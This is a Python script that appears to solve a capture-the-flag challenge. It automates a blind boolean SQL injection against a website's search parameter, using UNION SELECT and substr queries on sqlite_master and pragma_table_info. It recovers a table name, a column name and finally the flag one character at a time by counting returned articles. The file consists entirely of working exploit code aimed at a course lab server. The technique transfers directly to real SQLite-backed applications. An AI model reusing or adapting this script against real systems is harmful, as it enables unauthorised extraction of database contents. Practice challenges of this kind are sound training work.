import requests
import re
from multiprocessing import Queue
import string

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25262

link = f'{SERVER}:{PORT}'
s = requests.Session()
search_list = [""]

while len(search_list) > 0:
    previous_guess = search_list.pop(0)
    found = False
    for char in string.printable:
        guess = previous_guess + char
        request = s.get(f"{link}/?search='UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM sqlite_master WHERE type = 'table' and n ='{guess}';--")
        # get the number of articles
        try:
            sentence = re.findall(r'Found \d+ articles', request.text)[0] 
        # ignore sql errors
        except:
            continue 
        num_articles = re.findall(r"\d+", sentence)[0]
        if request.status_code == 200 and int(num_articles) > 4:
            print("Trying : " + guess)
            search_list.append(guess)
            found = True
        if not found:
            table_name = previous_guess
            
print("Table name: " + table_name)

search_list = [""]
while len(search_list) > 0:
    previous_guess = search_list.pop(0)
    found = False
    for char in string.printable:
        guess = previous_guess + char
        request = s.get(f"{link}/?search='UNION SELECT null, substr(name, 1, {len(guess)}) as n, null FROM pragma_table_info('{table_name}') WHERE n = '{guess}';--")
        # get the number of articles
        try:
            sentence = re.findall(r'Found \d+ articles', request.text)[0] 
        # ignore sql errors
        except:
            continue 
        num_articles = re.findall(r"\d+", sentence)[0]
        if request.status_code == 200 and int(num_articles) > 4:
            print("Trying : " + guess)
            search_list.append(guess)
            found = True
        if not found:
            column_name = previous_guess

print("column_name: " + column_name)

search_list = [""]
search_list = [""]
while len(search_list) > 0:
    previous_guess = search_list.pop(0)
    found = False
    for char in string.printable:
        if char == '+':
            continue
        guess = previous_guess + char
        request = s.get(f"{link}/?search='UNION SELECT null, substr({column_name}, 1, {len(guess)}) as n, null FROM {table_name} WHERE n = '{guess}';--")
        # get the number of articles
        try:
            sentence = re.findall(r'Found \d+ articles', request.text)[0] 
        # ignore sql errors
        except:
            continue 
        num_articles = re.findall(r"\d+", sentence)[0]
        if request.status_code == 200 and int(num_articles) > 4:
            print("Trying : " + guess)
            search_list.append(guess)
            found = True
        if not found:
            flag = previous_guess

print("Flag: " + re.search("SSof{.*}",flag).group(0))


              